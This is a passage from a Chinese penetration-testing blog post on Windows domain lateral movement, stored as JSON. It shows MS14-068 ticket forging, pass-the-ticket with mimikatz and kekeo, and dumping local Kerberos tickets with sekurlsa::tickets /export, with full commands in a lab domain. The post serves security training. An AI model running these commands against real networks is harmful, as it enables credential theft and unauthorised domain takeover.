8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>ms14-068.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码</p></blockquote>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">MS14-068.exe -u xiaobai@test.com -s S-1-5-21-4262547415-2925858076-1802417703-1111 -d 192.168.3.21 - p Admin123<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629175309522.png\" alt=\"image-20220629175309522\"></p>\n<p>这里需要密码是当前域用户的密码：Admin123</p>\n<p>之后在执行MS14-068的文件夹中查看生成了<code>TGT_xiaobai@test.com.ccache</code>票据。</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629175951736.png\" alt=\"image-20220629175951736\"></p>\n<p><strong>3、执行<code>klist命令</code>查看当前是否存在连接：</strong></p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629180302728.png\" alt=\"image-20220629180302728\"></p>\n<p>存在5个票据。</p>\n<p><strong>4、清空当前机器中所有凭证（如果有域成员凭证会影响凭证伪造）</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">执行:\nklist purge<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629180612217.png\" alt=\"image-20220629180612217\"></p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629180635479.png\" alt=\"image-20220629180635479\"></p>\n<p><strong>5、使用mimikatz将刚才生成的票据注入内存</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">mimikatz # kerberos::ptc TGT_xiaobai@test.com.ccache<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629181339141.png\" alt=\"image-20220629181339141\"></p>\n<p>注入票据成功。</p>\n<p><strong>6、尝试连接目标主机：</strong><br><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629181431518.png\" alt=\"image-20220629181431518\"></p>\n<p>拒绝访问是由于不支持ip地址连接；</p>\n<p>使用域名连接：</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629181453989.png\" alt=\"image-20220629181453989\"></p>\n<p><strong>7、mimikatz相关命令</strong>：</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>mimikatz # kerberos::purge &#x2F;&#x2F;清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</p>\n<p>mimikatz # kerberos::list &#x2F;&#x2F;查看当前机器凭证</p>\n<p>mimikatz # kerberos::ptc 票据文件 &#x2F;&#x2F;将票据注入到内存中</p></blockquote>\n<p>##0x05 PTT-传递kekeo票据注入</p>\n<p>###0x00</p>\n<p>下载地址：<br><a href=\"https://github.com/gentilkiwi/kekeo\">https://github.com/gentilkiwi/kekeo</a></p>\n<h3 id=\"0x01-3\"><a href=\"#0x01-3\" class=\"headerlink\" title=\"0x01\"></a>0x01</h3><p>先使用mimikatz获取NTLM：</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629191707398.png\" alt=\"image-20220629191707398\"></p>\n<p>生成票据：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">kekeo &quot;tgt::ask &#x2F;user:xiaobai &#x2F;domain:test.com &#x2F;ntlm:e45a314c664d40a227f9540121d1a29d&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注意：</p>\n<p>这里的NTLM使用的是域用户xiaobai的NTLM</p></blockquote>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629191812917.png\" alt=\"image-20220629191812917\"></p>\n<p>在当前文件夹生成了票据：<br><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629191952327.png\" alt=\"image-20220629191952327\"></p>\n<h3 id=\"0x02-1\"><a href=\"#0x02-1\" class=\"headerlink\" title=\"0x02\"></a>0x02</h3><p>将生成票据导入：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">kerberos::ptt TGT_xiaobai@TEST.COM_krbtgt~test.com@TEST.COM.kirbi<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629192727362.png\" alt=\"image-20220629192727362\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注意：<br>这里生成的票据需要和kekeo在同一文件夹，不然会导入失败。</p></blockquote>\n<h3 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h3><p>清除凭证之后查看凭据：<br><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629192921144.png\" alt=\"image-20220629192921144\"></p>\n<p>之后就可以连接目标主机。</p>\n<h2 id=\"0x06-PTT传递-利用本地票据\"><a href=\"#0x06-PTT传递-利用本地票据\" class=\"headerlink\" title=\"0x06 PTT传递-利用本地票据\"></a>0x06 PTT传递-利用本地票据</h2><h3 id=\"0x00-3\"><a href=\"#0x00-3\" class=\"headerlink\" title=\"0x00\"></a>0x00</h3><p>这种方式需要管理员权限，首先使用mimikatz收集号本地的票据（之前与域控建立连接的票据收集起来），之后再导入内存。</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629194427407.png\" alt=\"image-20220629194427407\"></p>\n<h3 id=\"0x01-4\"><a href=\"#0x01-4\" class=\"headerlink\" title=\"0x01\"></a>0x01</h3><p>mimikatz搜集本地票据：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sekurlsa::tickets &#x2F;export<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629194617732.png\" alt=\"image-20220629194617732\"></p>\n<p>当前文件夹查看收集到的凭据：</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629194638231.png\" alt=\"image-20220629194638231\"></p>\n<h3 id=\"0x02-2\"><a href=\"#0x02-2\" class=\"headerlink\" title=\"0x02\"></a>0x02</h3><p>导入凭据：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">kerberos::ptt xxxxxxxxxx.xxxx.kirbi<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>在搜集到的凭据里筛选凭据进行凭据注入。</p>\n<p>随便找一个凭据进行注入：</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629195449746.png\" alt=\"image-20220629195449746\"></p>\n<p>最后可以使用klist查看是否注入票据。</p>\n<h3 id=\"0x03-1\"><a href=\"#0x03-1\" class=\"headerlink\" title=\"0x03\"></a>0x03</h3><p>凭据只存活10个小时，超过10个小时失效：</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629194935338.png\" alt=\"image-20220629194935338\"></p>\n<h2 id=\"0x07-国产-Ladon-内网杀器\"><a href=\"#0x07-国产-Ladon-内网杀器\" class=\"headerlink\" title=\"0x07 国产 Ladon 内网杀器\"></a>0x07 国产 Ladon 内网杀器</h2><p>###0x00</p>\n<p>下载地址：</p>\n<p><a href=\"https://github.com/k8gege/Ladon/releases\">k8gege&#x2F;Ladon: 大型内网渗透扫描器</a></p>\n<p>解压密码：k8gege.org</p>\n<h3 id=\"0x01-5\"><a href=\"#0x01-5\" class=\"headerlink\" title=\"0x01\"></a>0x01</h3><p>支持CMD，也支持GUI。</p>\n","text":"0x00脑图： 0x01 Kerberos 协议###0x00 图解 0x01 介绍 客户机将明文密码进行 NTLM 哈希,然后和时间戳一起加密(使用krbtgt 密码 hash 作为密钥)，发送给 kdc（域控），kdc 对用户进行检测，成功之后创建 TGT(Ticket-Gr...","link":"","photos":[],"count_time":{"symbolsCount":"4.1k","symbolsTime":"4 mins."},"categories":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/categories/内网渗透.json"}],"tags":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/tags/内网渗透.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x00\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-Kerberos-%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">0x01 Kerberos 协议</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">0x01 介绍</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-PTH-NTML%E4%BC%A0%E9%80%92-Mimikatz\"><span class=\"toc-text\">0x02 PTH-NTML传递-Mimikatz</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-%E6%9C%AA%E6%89%93%E8%A1%A5%E4%B8%81%E4%B8%8B%E7%9A%84%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%8F%8A%E5%9F%9F%E8%BF%9E%E6%8E%A5\"><span class=\"toc-text\">0x00 未打补丁下的工作组及域连接</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01\"><span class=\"toc-text\">0x01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02\"><span class=\"toc-text\">0x02</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03-PTK-AES256%E4%BC%A0%E9%80%92-mimikatz\"><span class=\"toc-text\">0x03 PTK-AES256传递-mimikatz</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-1\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-1\"><span class=\"toc-text\">0x01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-2\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-2\"><span class=\"toc-text\">0x01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-3\"><span class=\"toc-text\">0x01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02-1\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x03\"><span class=\"toc-text\">0x03</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x06-PTT%E4%BC%A0%E9%80%92-%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0%E7%A5%A8%E6%8D%AE\"><span class=\"toc-text\">0x06 PTT传递-利用本地票据</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-3\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-4\"><span class=\"toc-text\">0x01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02-2\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x03-1\"><span class=\"toc-text\">0x03</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x07-%E5%9B%BD%E4%BA%A7-Ladon-%E5%86%85%E7%BD%91%E6%9D%80%E5%99%A8\"><span class=\"toc-text\">0x07 国产 Ladon 内网杀器</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-5\"><span class=\"toc-text\">0x01</span></a></li></ol></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"内网安全-域横向渗透【四】","uid":"377bf3c0ff3344364d83fd8924788afb","slug":"内网安全-域横向渗透【四】","date":"2022-06-30T02:12:36.000Z","updated":"2022-06-30T09:07:01.865Z","comments":true,"path":"api/articles/内网安全-域横向渗透【四】.json","keywords":null,"cover":[],"text":"0x00脑图： 0x01 RDP传递-Mimikatz0x00 RDP介绍远程桌面协议(RDP)是一个多通道的协议，让使用者(所在计算机称为用户端或’本地计算机’)连上提供微软终端机服务的计算机(称为服务端或’远程计算机’)。 大部分的Windows版本都有用户端所需软件，有些其...","link":"","photos":[],"count_time":{"symbolsCount":"3.2k","symbolsTime":"3 mins."},"categories":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/categories/内网渗透.json"}],"tags":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/tags/内网渗透.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"内网安全-域横向渗透【二】","uid":"3025b9eec92496f30bb6ae7638116cb8","slug":"内网安全-域横向渗透【二】","date":"2022-06-28T01:58:56.000Z","updated":"2022-06-28T08:53:25.956Z","comments":true,"path":"api/articles/内网安全-域横向渗透【二】.json","keywords":null,"cover":[],"text":"0x00 相关知识点0x001、Windows2012以上版本默认关闭wdigest，攻击者无法从内存中获取明文密码（mimikatz），只能获取相关的hash值； 2、Windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码 解决方法： 1、利用...","link":"","photos":[],"count_time":{"symbolsCount":"4.8k","symbolsTime":"4 mins."},"categories":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/categories/内网渗透.json"}],"tags":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/tags/内网渗透.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}